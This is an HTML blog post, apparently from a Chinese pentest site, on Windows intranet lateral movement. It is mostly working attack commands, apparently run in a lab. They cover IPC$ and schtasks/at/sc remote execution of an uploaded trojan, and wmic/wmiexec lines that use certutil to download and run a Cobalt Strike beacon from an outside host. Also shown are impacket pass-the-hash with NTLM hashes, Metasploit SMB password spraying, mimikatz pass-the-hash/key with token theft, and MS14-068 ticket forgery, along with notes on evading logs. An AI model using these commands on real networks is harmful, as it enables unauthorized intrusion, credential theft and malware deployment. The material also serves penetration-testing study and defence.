@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="YSec" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="与YSec共同进步" />
+  
+  
+  
+  <title>
+    
+      内网渗透-0x06 横向移动 
+      
+      
+      |
+    
+     YSec
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">YSec</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网渗透-0x06 横向移动</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-12-04 22:29:52
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                    <b>#</b> 内网渗透
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                    #内网渗透
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="横向移动">
+                    #横向移动
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p><strong>IPC</strong>：IPC共享命名管道的资源，可以实现对远程计算机的访问，通过验证用户名和密码获得响应权限</p>
+<blockquote>
+<p>使用工具：命令行<code>net</code>命令</p>
+</blockquote>
+<p><strong>SMB 会话</strong>：利用网络共享进行横向移动，通过 SMB 协议访问网络上的其他计算机。</p>
+<blockquote>
+<p>使用工具：<code>smbclient</code>, <code>crackmapexec</code>。</p>
+</blockquote>
+<p><strong>Windows 远程管理协议（WMI）</strong>：通过 WMI 进行远程命令执行，横向渗透到目标机器。</p>
+<blockquote>
+<p>使用工具：<code>wmiexec.py</code>, <code>PowerShell Remoting</code>。</p>
+</blockquote>
+<p><strong>密码喷洒</strong>：爆破smb服务</p>
+<blockquote>
+<p>使用工具：<code>MSF</code></p>
+</blockquote>
+<p><strong>获取凭证</strong>：攻击者可能会利用 <strong>Pass-the-Hash（PTH）</strong> 攻击、<strong>Pass-the-Ticket（PTT）</strong> 攻击等技术来获取其他系统的访问权限。</p>
+<blockquote>
+<p>使用工具：<code>mimikatz</code>, <code>hashdump</code>, <code>secretsdump.py</code>。</p>
+</blockquote>
+<p><strong>Kerberos 票据劫持</strong>：通过获取或窃取 Kerberos 票据来访问其他机器或服务。</p>
+<blockquote>
+<p>使用工具：<code>Kerberos tickets</code>, <code>Ticket Extraction</code>。</p>
+</blockquote>
+<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>只有域管理员才能开启IPC默认共享，默认共享是为了方便管理员远程管理而默认开启的共享，所以创建和连接都必须在管理员权限下操作，如果不是管理员会报权限错误。除此以外，也可以使用目标主机本地<code>Administrator</code>进行连接，但是该账户一般是停用的。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、目标机开启了139和445端口；</span><br><span class="line">2、目标主机管理员开启了ipc$默认共享；</span><br><span class="line">3、知道目标机的管理员账户密码。</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本连接"><a href="#基本连接" class="headerlink" title="基本连接"></a>基本连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">建立IPC连接命令：</span><br><span class="line">net use \\x.x.x.x\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;			#工作组</span><br><span class="line">net use \server\ipc$ &quot;password&quot; /user:domain\username 			#域内</span><br><span class="line"></span><br><span class="line">net use \192.168.4.2\ipc$ &quot;Aa123456&quot; /user:ysec\win10</span><br><span class="line"></span><br><span class="line">查看连接是否建立</span><br><span class="line">net use</span><br><span class="line"></span><br><span class="line">查看目标主机的文件夹</span><br><span class="line">dir  \\x.x.x.x\c$</span><br><span class="line"></span><br><span class="line">查看目标主机的文件</span><br><span class="line">type \\x.x.x.x\c$\1.txt</span><br><span class="line">查看目标主机的共享</span><br><span class="line">net view x.x.x.x</span><br><span class="line"></span><br><span class="line">查看目标主机的时间</span><br><span class="line">net time \\x.x.x.x</span><br><span class="line"></span><br><span class="line">断开连接：</span><br><span class="line">net use \\x.x.x.x\ipc$ /del</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错代码解释"><a href="#报错代码解释" class="headerlink" title="报错代码解释"></a>报错代码解释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">错误号 5，拒绝访问【很可能你使用的用户不是管理员权限的，先提升权限】</span><br><span class="line">错误号 51，Windows 无法找到网络路径【网络有问题】</span><br><span class="line">错误号 53，找不到网络路径【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）】</span><br><span class="line">错误号 67，找不到网络名【你的 lanmanworkstation 服务未启动；目标删除了 ipc$；】</span><br><span class="line">错误号 1219，提供的凭据与已存在的凭据集冲突【你已经和对方建立了一个ipc$，请删除后再连】</span><br><span class="line">错误号 1326，未知的用户名或错误密码【原因很明显了】</span><br><span class="line">错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">---</span><br><span class="line">情况1：可能是你在“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问，解决方法如下：</span><br><span class="line">开始--&gt;运行--&gt;gpedit.msc计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;用户权利指派--&gt;拒绝从网络访问这台计算机--&gt;删除你要正常连接的用户</span><br><span class="line">情况2：</span><br><span class="line">(1)网络访问为：经典</span><br><span class="line">(2)来宾账户状态：已启用，</span><br><span class="line">(3)拒绝从网络访问这台计算机里有Guest用户或组</span><br><span class="line">(4)你执行net use \\xxx.xxx.xxx.xxx\IPC$ &quot;123456&quot; /user:&quot;xxx&quot; 输入的用户名是随便输入的，这时也会遇到这个错误信息，因为当你连接的用户不存在时，net use会默认用Guest用户来进行连接，而Guest用户已拒绝从网络访问，所以也会出现这种错误</span><br><span class="line">---</span><br><span class="line">错误号 1792，试图登录，但是网络登录服务没有启动【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 2242，此用户的密码已经过期【目标有帐号策略，强制定期要求更改密码】</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 建立连接</span><br><span class="line">net use \server\ipc$ &quot;password&quot; /user:domain\username</span><br><span class="line">// 上传木马</span><br><span class="line">copy plugin_update.exe \\x.x.x.x\c$\windows\temp\plugin_update.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="at-winserver2012"><a href="#at-winserver2012" class="headerlink" title="at &lt; winserver2012"></a>at &lt; winserver2012</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net time \\x.x.x.x</span><br><span class="line">at \\x.x.x.x 12:10 c:\windows\temp\plugin_update.exe</span><br><span class="line"></span><br><span class="line">// 推荐win08后都使用schtasks</span><br></pre></td></tr></table></figure>
+
+<h4 id="schtasks-winserver2012"><a href="#schtasks-winserver2012" class="headerlink" title="schtasks &gt;&#x3D; winserver2012"></a>schtasks &gt;&#x3D; winserver2012</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">创建计划任务</span><br><span class="line">schtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 22:58 /S 192.168.4.2 /RU System /u administrator /p &quot;Aa123456&quot;</span><br><span class="line"></span><br><span class="line">立即执行计划任务</span><br><span class="line">schtasks /run /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;Aa123456&quot;</span><br><span class="line"></span><br><span class="line">删除计划任务</span><br><span class="line">schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;Aa123456&quot;</span><br><span class="line"></span><br><span class="line">计划任务远程开启默认共享&#123;注意查看目标主机时间&#125;</span><br><span class="line">schtasks /create /tn &quot;plugin_update&quot; /tr &quot;cmd /c net share c$=c:&quot; /sc once /st 16:25 /S 192.168.1.1 /RU System /u administrator /p &quot;Aa123456&quot;</span><br></pre></td></tr></table></figure>
+
+<p>除此以外还有sc创建服务，参考<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1691880">https://cloud.tencent.com/developer/article/1691880</a></p>
+<p>对于上述内容均使用命令实现，整体不方便，下面介绍工具的使用</p>
+<h3 id="Atexec"><a href="#Atexec" class="headerlink" title="Atexec"></a>Atexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 明文密码</span><br><span class="line">python atexec.py .\administrator:Admin12345@192.168.3.21 &quot;whoami&quot; # 本地明文建立IPC连接并执行命令</span><br><span class="line">python atexec.py ysec\administrator:Admin12345@192.168.3.21 &quot;whoami&quot; # 域内主机建立IPC连接并执行命令</span><br><span class="line"></span><br><span class="line">// administrator hash</span><br><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot; #本地用户使用hash进行IPC连接</span><br><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ysec/administrator@192.168.3.21 &quot;whoami&quot; #本地用户使用hash进行IPC连接</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><ol>
+<li>使用135端口，支持明文密码或者hash的方式进行认证，并且该方法不在日志留痕。</li>
+<li>远程系统需要开启WMI服务开放135端口，wmic会以管理员权限在远程系统执行命令。</li>
+<li>如果远程系统开启了防火墙，wmic将无法连接。</li>
+<li>wmic无回显时，需要使用ipc$和type读取信息。使用wmic执行恶意程序不会留下日志。</li>
+</ol>
+<h3 id="利用条件和注意事项"><a href="#利用条件和注意事项" class="headerlink" title="利用条件和注意事项"></a>利用条件和注意事项</h3><ol>
+<li>目标防火墙已事先允许135、445端口连入，且本地杀软、EDR未拦截wmic.exe,cmd.exe等执行；</li>
+<li>有些域账户只允许在指定的域内机器上才可登录，所以如果发现账密是对的，却会提示 “拒绝访问” ；</li>
+<li>出现提示”无效句柄” 之类的错误，可尝试把目标ip换成机器名或者把机器名换成ip，ip或机器名用双引号包起来；</li>
+<li>当提示 “RPC服务器不可用”时，有可能是目标防火墙导致135端口不通，或者目标系统没开135端口，要么就是被对方杀软或EDR拦截。</li>
+</ol>
+<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>系统自带工具，执行过程有单模式执行和交互式执行，可以只执行命令或者反弹shell<br>单命令执行，执行结果不回显时可以上传木马执行，上线CS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 下载木马</span><br><span class="line">wmic /node:192.168.4.2 /user:administrator /password:Aa123456 process call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;</span><br><span class="line"></span><br><span class="line">// 执行木马</span><br><span class="line">wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create &quot;cmd.exe c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用模板如下，其中<code>cmd.exe /c</code>表示执行完后关闭控制台面板，没有<code>/c</code>表示保留界面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:x.x.x.x /user:administrator /password:xx process call create &quot;cmd.exe /c 命令&quot;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:191.168.52.136 /user:xxxx /password:xxxxx  process call create &quot;cmd.exe /c ipconfig &gt; d:\result.txt&quot;</span><br><span class="line">无需上传第三方软件，利用系统内置程序,单命令执行，执行后无结果回显</span><br></pre></td></tr></table></figure>
+
+<h3 id="cscript"><a href="#cscript" class="headerlink" title="cscript"></a>cscript</h3><p>利用系统内置命令，可获取交互式shell<br>（无法在cs中使用，因运行成功后会一直进行反弹连接，导致卡bug）<br>需上传<code>wmiexec.vbs</code>然后进入该服务器内进行执行。<br><code>Wmiexec.vbs</code>脚本通过<code>VBS</code>调用<code>WMI</code>来模拟<code>PsExec</code>功能。<code>wmiexec.vbs</code>可以在远程系统中执行命令并进行回显，获得远程主机的半交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 10.211.55.10 administrator admin!@#45</span><br></pre></td></tr></table></figure>
+
+
+
+<p>缺点：wmic和cscript都无法进行hash传递</p>
+<h3 id="wmiexecu"><a href="#wmiexecu" class="headerlink" title="wmiexecu"></a>wmiexecu</h3><p>第三方软件 (交互式&amp;单执行)<br>无法在cs中执行后回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@#45@10.211.55.10 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@10.211.55.10 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">// 上传木马上线</span><br><span class="line">wmiexec ./administrator:admin!@#45@10.211.55.10 &quot;cmd.exe /c certutil -urlcache -split -f http://10.211.55.7/beacon.exe c:/beacon.exe&quot;</span><br><span class="line">wmiexec ./administrator:admin!@#45@10.211.55.10 &quot;cmd.exe /c c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>缺点：第三方软件会被杀软查杀</p>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>利用smb服务可以通过明文或hash传递来远程执行</p>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、445端口开放</span><br><span class="line">2、知道账号密码</span><br></pre></td></tr></table></figure>
+
+<h3 id="psexec-官方"><a href="#psexec-官方" class="headerlink" title="psexec(官方)"></a>psexec(官方)</h3><p>下载：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe \\10.211.55.10 -u administrator -p admin!@#45 -s cmd</span><br></pre></td></tr></table></figure>
+
+<h3 id="psexec（impacket套件）"><a href="#psexec（impacket套件）" class="headerlink" title="psexec（impacket套件）"></a>psexec（impacket套件）</h3><p>可获取交互式shell使用工具为impacket套件，可使用hash传递</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@10.211.55.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="cs中的psexecu"><a href="#cs中的psexecu" class="headerlink" title="cs中的psexecu"></a>cs中的psexecu</h3><p><img src="/pic/image-20241204111506371.png" alt="image-20241204111506371"></p>
+<h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><p>交互式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smbexec ./administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec god/administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>使用msf对smb服务进行密码爆破，任意暴露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/psexec</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set smbuser user.txt</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set smbpass password.txt</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set rhost 192.168.52.0/24</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h2 id="PTH-哈希传递"><a href="#PTH-哈希传递" class="headerlink" title="PTH - 哈希传递"></a>PTH - 哈希传递</h2><p>Paaa the hash也就是哈希传递，通过找到与账号相关的密码散列值 (通常是 NTLM Hash) 来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。</p>
+<h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、在工作组环境中：</span><br><span class="line">Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</span><br><span class="line">Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问</span><br><span class="line">2、在域环境中：</span><br><span class="line">只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器</span><br><span class="line">如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1</span><br></pre></td></tr></table></figure>
+
+<h3 id="mimikatz-cs"><a href="#mimikatz-cs" class="headerlink" title="mimikatz+cs"></a>mimikatz+cs</h3><p>使用cs的mimikatz进行pth，发现执行后在目标主机上弹出cmd窗口，可利用进程窃取，直接在cs上进行远程操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:10.211.55.7 /ntlm:518b98ad4178a53695dc997aa02d455c</span><br><span class="line">steal_token 3420</span><br><span class="line">dir \\10.211.55.7\c$</span><br></pre></td></tr></table></figure>
+
+<p>可以看到运行mimikatz之后会生成的cmd进程</p>
+<p><img src="/pic/16303733945959-1733283222550-3.jpg" alt="16303733945959"></p>
+<p>利用cs进程劫持，劫持cmd进程，然后可发现成功执行目标机命令</p>
+<p><img src="/pic/16303736699164-1733283249912-5.jpg" alt="16303736699164"></p>
+<p>之后可复制文件，创建启动服务命令上线CS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.211.55.7\c$</span><br><span class="line">copy beacon.exe \\10.211.55.7\c$</span><br><span class="line">sc \\TALE2B52 create csshell binpath= &quot;c:\beacon.exe&quot;</span><br><span class="line">sc \\TALE2B52 start csshell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/16303786151858-1733283377591-8.jpg" alt="16303786151858"></p>
+<h2 id="PTK-密钥传递"><a href="#PTK-密钥传递" class="headerlink" title="PTK - 密钥传递"></a>PTK - 密钥传递</h2><p>即 Pass The Key ，当系统安装了 KB2871997 补丁且禁用了 NTLM 的时候，那我们抓取到的 ntlm hash. 也就失去了作用，但是可以通过 pass the key 的攻击方式获得权限。成功几率不是很高，利用条件苛刻。</p>
+<h3 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取用户的aes key</span><br><span class="line">mimikatz sekurlsa::ekeys</span><br><span class="line">sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&quot;</span><br><span class="line">成功后会返回一个cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/16304852419244.jpg" alt="16304852419244"></p>
+<p><img src="/pic/16304870292958.jpg" alt="16304870292958"></p>
+<h2 id="PTT-票据传递（ms14-068）"><a href="#PTT-票据传递（ms14-068）" class="headerlink" title="PTT - 票据传递（ms14-068）"></a>PTT - 票据传递（ms14-068）</h2><p>pass the ticket</p>
+<h3 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.域控没有打MS14-068的补丁(KB3011780)</span><br><span class="line">2.拿下一台加入域的计算机</span><br><span class="line">3.有这台域内计算机的域用户密码和Sid</span><br><span class="line"></span><br><span class="line">MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">获取当前用户的SID值，并上传MS14-068漏洞利用文件，然后执行生成攻击域控主机的TGT凭据</span><br><span class="line"></span><br><span class="line">shell whoami/user</span><br><span class="line"></span><br><span class="line">upload &quot;F:\tq\MS14-068.exe&quot; &quot;C:\ms14-068.exe&quot;</span><br><span class="line">shell /remotepath/ms14-068.exe -u user@ysec.com -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d DC的IP -p admin!@#45</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">ms14-068.exe -u lisi@goksec.org -p goksec@2021 -s S-1-5-21-1797401017-738776913-2751391128-1106 -d DC.goksec.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/16305529066120.jpg" alt="16305529066120"></p>
+<p><img src="/pic/16305529254258.jpg" alt="16305529254258"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前主机票证</span><br><span class="line">shell klist</span><br><span class="line"># 然后清除票证</span><br><span class="line">shell klist purge</span><br><span class="line"># 使用mimikatz将生成的票证导入到内存中，不需要上传mimikatz</span><br><span class="line">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20241204155217561.png" alt="image-20241204155217561"></p>
+<p>注：Kerberos认证协议中仅支持对计算机名进行认证，无法使用ip地址认证。<br>使用下面命令进行读取域控c盘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\主机名\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20241204155403149.png" alt="image-20241204155403149"></p>
+<p>接着转发上线即可</p>
